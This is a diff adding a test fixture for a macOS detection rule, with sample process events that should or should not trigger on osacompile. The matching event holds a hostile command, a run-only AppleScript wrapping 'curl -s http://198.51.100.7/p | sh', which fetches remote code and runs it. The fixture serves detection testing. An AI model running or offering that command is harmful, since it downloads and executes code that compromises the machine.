@@ -1,0 +1,11 @@
+match:
+  - desc: "osacompile builds a run-only script from inline code"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4801, "ppid": 4000, "exe": "/usr/bin/osacompile", "name": "osacompile", "args": ["osacompile", "-x", "-e", "do shell script \"curl -s http://198.51.100.7/p | sh\"", "-o", "/tmp/a.scpt"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osacompile", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
+nomatch:
+  - desc: "benign lookalike - osacompile of a script file without -x"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4811, "ppid": 4000, "exe": "/usr/bin/osacompile", "name": "osacompile", "args": ["osacompile", "-o", "/Users/rifqi/Library/Scripts/hello.scpt", "/Users/rifqi/hello.applescript"], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osacompile", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
+  - desc: "osascript -e (not osacompile)"
+    events:
+      - {"name": "CreateProcess", "platform": "macos", "proc": {"pid": 4812, "ppid": 4000, "exe": "/usr/bin/osascript", "name": "osascript", "args": ["osascript", "-e", "display notification \"done\""], "uid": 501, "euid": 501, "is_platform": true, "is_signed": true, "signing_id": "com.apple.osascript", "parent": {"pid": 4000, "exe": "/bin/zsh", "name": "zsh"}}}
